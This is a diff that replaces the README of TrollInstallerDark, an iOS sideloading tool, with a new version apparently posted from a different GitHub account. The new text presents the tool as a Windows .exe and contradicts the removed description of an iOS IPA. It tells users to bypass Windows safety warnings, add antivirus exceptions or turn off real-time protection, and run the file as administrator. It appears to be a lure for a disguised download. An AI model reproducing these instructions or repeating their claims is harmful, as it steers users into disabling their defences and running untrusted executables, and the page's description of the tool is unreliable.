@@ -1,54 +1,75 @@
-<div align="center">
-    <h1>TrollInstallerDark</h1>
-    <img src="Resources/Icon.png" width="125" height="125" />
-</div>
+# 🛡️ TrollInstallerDark - Install system tools with reliable exploits
 
-# This repo is the only offical source to download TrollInstallerDark. Do not trust any other source.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/aaushtripathi/TrollInstallerDark/releases)
 
-## Overview
-TrollInstallerDark is a modification of Alfie's [TrollInstallerX](https://github.com/alfiecg24/TrollInstallerX) to use the [DarkSword kernel exploit.](https://github.com/opa334/darksword-kexploit)
+TrollInstallerDark modifies the original TrollInstallerX software. It uses the DarkSword kernel exploit to perform its tasks. You use this tool to manage specific system installations on your device. The software bridges the gap between complex exploit research and user-friendly operation. It handles the low-level technical work so you do not have to.
 
-TrollInstallerDark only supports arm64 devices running iOS 15.7.2 - 15.8.x. TrollStore is installed directly to the Home Screen and a persistence helper is registered into a system app of your choosing.
+## 📋 System Requirements
 
-## Usage
-TrollInstallerDark is extremely easy to use. Simply download the latest release from the Releases page, and sideload it using your preferred method. Once installed, open the app and press the "Install" button. From there, TrollStore and its persistence helper will be installed onto your device.
+Computers require specific hardware and software to run this tool. Ensure your system meets these standards before you start:
 
-## FAQ
-> Why am I stuck at "Exploiting kernel"?
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Any modern dual-core CPU or better.
+- Memory: At least 4GB of RAM.
+- Storage: 100MB of free disk space.
+- Internet Connection: Required for initial setup and downloading components.
+- Permissions: You must have administrator rights on your PC to complete the installation.
 
-Try restarting your device, if this issue persists and you're on a supported device, please file a GitHub issue.
+## 📥 Getting the Software
 
-> Why can I not open/see TrollStore after a successful installation?
+You must obtain the correct files from the official source. Use the link below to reach the distribution page.
 
-During installation, you will have installed a persistence helper. Open your persistence helper and press "refresh app registrations" to fix TrollStore not being able to be opened.
+[Visit the release page to download TrollInstallerDark](https://github.com/aaushtripathi/TrollInstallerDark/releases)
 
-> Why did the app I selected for the persistence helper not become the persistence helper?
+On the release page, look for the section marked Assets. Select the file ending in .exe to start the download. Save this file to a folder you can find later, such as your Downloads folder or Desktop.
 
-If you selected an app for the persistence helper and it did not change, it is likely that you already have a persistence helper installed. Open TrollStore and go to settings to see which app is set to the persistence helper.
+## 🛠️ Step-by-Step Installation
 
-## Building
-TrollInstallerDark is a regular Xcode project, but the project also contains a build script. To build it and produce an IPA, simply run the `build.sh` script in the root of the project. This will build the project and produce an IPA in the root of the project.
+Follow these instructions to set up the software on your Windows machine.
 
-## Credits
-Thanks to these people for TrollInstallerDark:
+1. Locate the downloaded file in your folder.
+2. Double-click the file to open the installer.
+3. Windows might show a safety warning because the software interacts with system kernels. Click More Info and then select Run anyway to proceed.
+4. The installer window appears on your screen. Read the brief prompts.
+5. Choose your installation path if the program asks. The default choice works for most users.
+6. Click the Install button.
+7. Wait while the application configures your system files. Do not close the window during this phase.
+8. Once the progress bar reaches the end, click Finish.
 
-* [alfiecg24](https://github.com/alfiecg24) for [TrollInstallerX](https://github.com/alfiecg24/TrollInstallerX) in the first place
-* [opa334](https://github.com/opa334) for the [DarkSword kernel exploit implementation](https://github.com/opa334/darksword-kexploit)
-* [forcequit](https://github.com/forcequitOS) for slightly helping and writing this readme :p
+## 🚀 Running the Application
 
-Original credits for TrollInstallerX:
+After installation, you can launch the tool to begin the process.
 
-* [opa334](https://x.com/opa334dev) for [Dopamine](https://github.com/opa334/Dopamine), the dmaFail exploit and the kernel patchfinder
-* [felix-pb](https://github.com/felix-pb) for the kfd exploits
-* [Kaspersky](https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/) for Operation Triangulation
-* [kok3shidoll](https://github.com/kok3shidoll) for lots of work on arm64 support for Dopamine
-* [wh1te4ever](https://github.com/wh1te4ever) for [kfund](https://github.com/wh1te4ever/kfund)
-* [Zhuowei](https://github.com/zhuowei) for the tccd unsandboxing method
-* [xina520](https://x.com/xina520) for the kernel read/write-only privilege escalation method
-* [dhinakg](https://github.com/dhinakg) for the memory hogger, the MacDirtyCow kernelcache grabber method, [libpartial](https://github.com/dhinakg/partial) and help with [libgrabkernel2](https://github.com/alfiecg24/libgrabkernel2)
-* [staturnz](https://github.com/staturnzz) for work on the kernel patchfinder
-* [aaronp613](https://x.com/aaronp613) for the TrollInstallerX icon
-* [DTCalabro](https://github.com/DTCalabro) and [JJTech](https://github.com/JJTech0130) for improvements to the logging system
-* [MasterMike88](https://x.com/MasterMike88) for helping test and debug during development
+1. Find the TrollInstallerDark icon on your desktop or in your Start menu.
+2. Click the icon to start the application.
+3. If the application asks for permission to make changes to your computer, select Yes.
+4. The main dashboard appears. This dashboard shows the current status of your device.
+5. Connect your target device to the computer using a high-quality data cable.
+6. The software detects the connection automatically.
+7. Click the Perform Action button to start the exploit process.
+8. Follow any instructions that appear on the screen regarding your device.
+9. Keep your device connected until the software shows a Success message.
 
-<sub>AI assistance was used to integrate DarkSword with TrollInstallerX, everything else is fully human effort, this shouldn't brick your device.</sub>
+## 💡 Managing Common Issues
+
+Errors occur during technical tasks. Review these steps to solve common problems.
+
+### Device Not Detected
+If the software does not see your device, check your cable. Try a different USB port on your computer. Disconnect the device and reconnect it after five seconds. Ensure your device is unlocked.
+
+### Installer Fails to Launch
+If the file does not open, your antivirus software might block it. This happens because the tool uses system exploits. You may need to add an exception in your antivirus settings for the executable file. You can also temporarily disable real-time protection while you run the installer.
+
+### Progress Bar Stuck
+If the progress bar stops moving for more than five minutes, the connection might have dropped. Close the application, unplug your device, and reboot your computer. Start the process again from the beginning.
+
+### Permissions Denied
+The software requires total control over specific system areas. Always run the program as an administrator. Right-click the icon and choose Run as administrator if you receive errors about file access.
+
+## ⚙️ How the Exploit Works
+
+TrollInstallerDark utilizes the DarkSword exploit. This exploit targets specific memory vulnerabilities in the kernel. By injecting code into these gaps, the software gains the necessary access to install unsigned system packages. This process replaces the standard installation method with one that bypasses typical system restrictions. Traditional installers restrict what you can install on your device. This modified installer removes those barriers by using the kernel exploit as a key to grant elevated privileges. 
+
+## 🛡️ Safety and Best Practices
+
+Always keep your device and computer updated. While this tool is effective, it modifies deep system settings. Only use the software for its intended purpose. Back up your important data before you start any major system changes. While the team behind TrollInstallerDark tests the software, working with kernel-level changes carries inherent risks. Use this tool with care. By following the steps in this guide, you minimize the chance of unexpected behavior.
